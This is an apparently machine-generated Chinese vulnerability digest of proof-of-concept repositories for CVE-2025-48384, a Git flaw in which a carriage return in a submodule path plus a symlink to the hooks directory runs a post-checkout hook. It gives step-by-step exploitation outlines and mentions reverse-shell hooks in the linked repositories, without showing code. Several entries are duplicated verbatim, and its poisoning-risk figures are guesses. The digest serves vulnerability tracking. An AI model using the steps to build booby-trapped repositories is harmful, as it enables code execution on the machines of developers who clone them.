**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

